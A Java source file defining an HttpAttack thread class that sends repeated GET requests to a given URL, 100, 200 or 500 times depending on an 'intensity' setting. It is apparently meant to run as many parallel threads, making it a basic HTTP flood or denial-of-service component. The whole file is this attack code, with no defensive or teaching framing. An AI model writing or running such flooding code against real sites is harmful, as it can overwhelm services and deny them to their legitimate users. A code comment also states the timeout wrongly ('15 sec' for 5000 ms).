import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @Author: Douglas A. Giovanella
 * @Email: douglas_giovanella@hotmail.com
 * @Date: 25/07/2018
 */
public class HttpAttack extends Thread {
    private static final int LOW = 1;
    private static final int MEDIUM = 2;
    private static final int HIGH = 3;

    private static final int REQUEST_LOW = 100;
    private static final int REQUEST_MEDIUM = 200;
    private static final int REQUEST_HIGH = 500;

    private URL url;
    private int intensity;

    public HttpAttack(String url, int intensity) {
        try {
            this.url = new URL(url);
            this.intensity = intensity;
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
    }

    private static int getNumRequest(int intensity) {
        switch (intensity) {
            case LOW:
                return REQUEST_LOW;
            case MEDIUM:
                return REQUEST_MEDIUM;
            default:
                return REQUEST_HIGH;
        }
    }

    public void run() {
        int i = 0;
        int request = getNumRequest(this.intensity);
        while (i < request) {
            try {
                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
                conn.setAllowUserInteraction(true);
                conn.setConnectTimeout(5000); // 15 sec. connection timeout
                conn.setDoInput(true);
                conn.setDoOutput(false);
                conn.setUseCaches(false);
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");

                conn.connect();
                conn.getResponseCode();
            } catch (Exception e) {
                System.out.println(e.getMessage());
            }
            i++;
        }
    }
}